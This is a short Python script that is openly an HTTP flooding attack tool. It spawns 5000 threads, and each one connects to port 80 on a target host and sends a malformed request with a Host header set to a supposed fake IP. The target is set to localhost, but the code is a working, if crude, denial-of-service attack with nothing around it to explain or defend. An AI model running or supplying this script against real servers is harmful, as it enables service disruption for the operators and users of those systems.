import socket
import threading


target = 'localhost'
fake_ip = '124.212.221.116'
port = 80

def attack():
        s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
        s.connect((target,port))
        s.sendto(("ABCD /"+ target + " HTTP/1.1\r\n").encode('ascii'),(target,port))
        s.sendto(("Host: "+ fake_ip + " \r\n\r\n").encode('ascii'),(target,port))


for i in range(5000):
    print(i)
    thread = threading.Thread(target=attack)
    thread.start()
